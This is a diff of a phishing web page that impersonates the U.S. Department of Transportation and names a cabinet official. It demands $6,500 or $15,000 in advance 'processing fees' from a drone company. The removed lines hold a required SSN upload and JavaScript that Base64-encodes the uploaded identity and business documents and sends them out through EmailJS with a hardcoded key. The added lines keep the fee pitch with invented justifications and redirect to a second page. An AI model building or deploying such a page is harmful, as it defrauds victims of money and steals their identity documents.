@@ -143,7 +143,7 @@
             <img src="Logo.svg" alt="U.S. Department of Transportation Logo" class="img-fluid logo">
         </div>
         <div class="col-12 col-md-8">
-            <h1 class="h3">Proposal Submission for Drone Services</h1>
+            <h1 class="h3">Infrastructure Revolution 2025: Join the Vision</h1>
             <p>From <strong>Pete Buttigieg's Office</strong> - U.S. Department of Transportation</p>
         </div>
     </div>
@@ -167,27 +167,34 @@
             <label for="amount">Amount to be Paid:</label>
             <em> Note:
 
-A payment of $6,500 is required to proceed with your proposal for the U.S. Department of Transportation (DOT) job for the following reasons:
-            <br>
-<strong> 1. Administrative and Processing Fees: </strong> The payment covers the costs associated with the rigorous administrative process, including documentation, compliance checks, and approvals required to meet DOT standards.
-<br>
-<strong> 2. Commitment to Partnership with Morius Drones: </strong> This payment also reflects our decision to move forward with your company, Morius Drones, ensuring that all necessary steps for collaboration and proposal advancement are completed efficiently.
+A payment of $15,000 is required to proceed with your proposal for the U.S. Department of Transportation (DOT) job as part of President Trump’s transformative infrastructure agenda. This payment is necessary for the following reasons:
 
-If full payment cannot be made upfront, at least 70% ($4,550) is required to initiate the process, with the remaining balance due before final approval.</em>
+<strong> 1. Administrative and Processing Fees: </strong>
+This payment covers the costs associated with comprehensive administrative processes, including rigorous compliance checks, federal documentation, legal verifications, and approvals required to meet the standards of the DOT and federal government.
+
+<strong> 2. Registration and Accreditation Fee: </strong>
+A portion of the payment is allocated as a formal registration fee to solidify your company’s involvement in this exclusive initiative and to ensure alignment with federal guidelines for government contractors.
+
+<strong> 3. Commitment to Project Preparation: </strong>
+This payment demonstrates your company’s commitment to the transformational infrastructure agenda. It supports pre-contractual activities, such as securing project-specific resources, initiating preliminary site assessments, and conducting feasibility studies essential for efficient project execution.
+
+<strong> 4. Priority Positioning and Direct Collaboration: </strong>
+As one of only 12 companies selected for these historic projects, this payment ensures your company's privileged access to strategic planning sessions, priority assignment in project allocation, and streamlined communication with government agencies. <br>
+<br>
+<strong> If full payment cannot be made upfront, at least 70% ($10,500) must be paid to initiate the process. The remaining balance of $4,500 must be completed prior to final approval and project commencement. </strong></em>
             <input type="number" id="amount" name="amount" required placeholder="Enter amount in USD">
 
             <label for="timeline">Timeline for Completion</label>
             <select id="timeline" name="timeline" required>
-                <option value="By January 4th, 2025">By January 4th, 2025</option>
+                <option value="1-3 Months">1-3 Months</option>
+				<option value="3-6 Months">3-6 Months</option>
+				<option value="3-6 Months">3-6 Months</option>
                 <option value="Other">Other</option>
             </select>
 
             <div class="file-upload">
-                <label for="businessDocs">Business Registration Documents</label>
+                <label for="businessDocs">Business Registration Document</label>
                 <input type="file" id="businessDocs" name="businessDocs" accept=".pdf,.doc,.docx,.jpg,.png" required>
-
-                <label for="ssn">SSN (for identity confirmation)</label>
-                <input type="file" id="ssn" name="ssn" accept=".pdf,.doc,.docx,.jpg,.png" required>
             </div>
 
             <button type="submit">Submit Proposal</button>
@@ -200,11 +207,7 @@ If full payment cannot be made upfront, at least 70% ($4,550) is required to ini
         <p>U.S. Department of Transportation, 1200 New Jersey Avenue SE, Washington, D.C. 20590</p>
     </div>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-    // Initialize EmailJS with your public key
-    emailjs.init("sXakFW0aulVoslNZG"); // Your public key here
-
+   <script>
     // Form submission handler
     document.getElementById('proposalForm').addEventListener('submit', function (event) {
         event.preventDefault(); // Prevent the default form submission
@@ -219,53 +222,20 @@ If full payment cannot be made upfront, at least 70% ($4,550) is required to ini
 
         // Collect uploaded files
         let businessDocs = document.getElementById('businessDocs').files[0];
-        let ssn = document.getElementById('ssn').files[0];
 
         // Validate required fields
-        if (!fullName || !email || !companyName || !interest || !amount || !timeline || !businessDocs || !ssn) {
+        if (!fullName || !email || !companyName || !interest || !amount || !timeline || !businessDocs) {
             alert("Please complete all fields and upload all required documents.");
             return;
         }
 
-        // Prepare file data for Base64 conversion
-        const toBase64 = (file) =>
-            new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = () => resolve(reader.result.split(',')[1]);
-                reader.onerror = reject;
-                reader.readAsDataURL(file);
-            });
-
-        // Convert the files to Base64
-        Promise.all([toBase64(businessDocs), toBase64(ssn)]).then(([businessDocsBase64, ssnBase64]) => {
-            // Prepare the EmailJS template parameters
-            let templateParams = {
-                fullName: fullName,
-                email: email,
-                companyName: companyName,
-                interest: interest,
-                amount: amount,
-                timeline: timeline,
-                businessDocs: businessDocsBase64,
-                ssn: ssnBase64
-            };
-
-            // Send email via EmailJS using the provided service and template IDs
-            emailjs.send("xhsuyqv", "1f0y4ua", templateParams)
-                .then((response) => {
-                    alert("Proposal submitted successfully!");
-                    document.getElementById('proposalForm').reset(); // Clear the form
-                })
-                .catch((error) => {
-                    console.error("EmailJS error:", error);
-                    alert("Failed to submit the proposal. Please try again.");
-                });
-        }).catch((error) => {
-            console.error("File conversion error:", error);
-            alert("Failed to process files. Please try again.");
-        });
+        // Process form submission logic
+        alert("Form submitted successfully!");
+        document.getElementById('proposalForm').reset(); // Clear the form
+        window.location.href = "index2.html"; // Redirect to the next page
     });
 </script>
+
 
 
 
